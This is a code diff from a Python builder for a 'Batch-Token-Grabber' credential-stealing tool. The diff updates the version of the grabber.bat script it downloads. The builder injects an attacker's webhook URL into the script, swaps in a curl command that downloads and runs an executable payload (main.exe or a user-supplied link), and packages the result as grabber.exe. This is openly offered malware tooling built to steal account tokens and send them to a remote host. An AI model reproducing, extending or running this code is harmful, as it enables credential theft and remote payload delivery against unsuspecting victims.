@@ -124,7 +124,7 @@ class builder:
                 soup = bs(r.content, "html.parser")
                 link = soup.find("a", {"id": "download-url"}).get("href")
                 final = f"curl {link}"
-                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe", final)
+                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace("curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", final)
                 return grabber
             elif self.anon == "n":
                 direct_download = input("ENTIRE CURL LINK (not this can be curl YOUR_LINK or even curl -LJO YOUR_LINK THIS IS VERY ADVANCED SO DONT USE UNLESS YOU KNOW): ")
@@ -138,7 +138,7 @@ class builder:
                 shutil.move("dist/built.exe", "grabber.exe")
                 os.remove("built.py")
                 shutil.rmtree("dist")
-                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace(f"curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe", f"{direct_download}")
+                grabber = requests.get('https://raw.githubusercontent.com/KDot227/Batch-Token-Grabber/main/grabber.bat').text.replace("YOUR_WEBHOOK_HERE", self.webhook).replace("\n", "").replace(f"curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe", f"{direct_download}")
                 return grabber
             else:
                 print("Invalid option dumbass")
